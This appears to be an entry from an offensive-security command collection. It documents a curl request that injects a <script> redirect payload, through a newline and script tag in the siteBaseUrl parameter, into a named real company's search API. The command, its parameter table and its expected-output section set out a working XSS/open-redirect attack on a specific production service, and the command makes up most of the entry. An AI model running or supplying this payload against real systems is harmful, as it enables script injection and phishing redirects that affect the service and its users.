---
data: >-
  curl
  "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=███████:vwt2u5wngbk&siteBaseUrl=http://googl.com/%0a
  <script>window.location='https://google.com';</script>"
tags:
  - open-redirect
  - xss
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:11.113Z'
id: 23f555e2-b136-4c44-af52-93a54fde50fe
verified: false
validated: true
submitted: true
---
# inject-open-redirect-payload

## Command

```bash
curl "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=███████:vwt2u5wngbk&siteBaseUrl=http://googl.com/%0a <script>window.location='https://google.com';</script>"
```

## Description

Injects a script to redirect the browser to an external site via XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| siteBaseUrl | Redirect script payload | Yes |

## Examples

### Basic Usage

```bash
curl "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=yourkey&query=coffe&partnerid=yourid&siteBaseUrl=http://googl.com/%0a<script>window.location='https://google.com';</script>"
```

## Expected Output

Browser redirects to https://google.com upon execution.

## Related

- [[commands/inject-xss-payload-sitebaseurl]]
